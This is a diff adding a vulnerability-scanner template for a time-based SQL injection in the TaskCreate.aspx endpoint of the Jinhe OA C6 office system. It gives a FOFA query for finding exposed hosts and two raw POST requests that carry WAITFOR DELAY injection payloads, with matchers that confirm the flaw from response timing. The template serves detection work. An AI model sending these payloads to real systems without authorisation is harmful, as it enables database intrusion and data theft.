@@ -1,0 +1,31 @@
+id: jinhe-oa-taskcreate-sqli
+info:
+  name: 金和OA系统TaskCreate.aspx接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="金和网络-金和OA"
+          金和网络OA系统C6版本中的TaskCreate.aspx接口存在SQL注入漏洞，攻击者可通过构造恶意输入执行任意SQL命令，导致数据泄露或篡改。漏洞披露日期为2025-08-22
+  tags: 金和OA
+http:
+- raw:
+  - |
+    POST /c6/Jhsoft.Web.dailytaskmanage/TaskCreate.aspx/ HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    Connection: close
+
+    taskID=1'WAITFOR+DELAY'0%3a0%3a5'--
+  - |
+    POST /c6/Jhsoft.Web.dailytaskmanage/TaskCreate.aspx/ HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    Connection: close
+
+    taskID=1'WAITFOR+DELAY'0%3a0%3a8'--
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
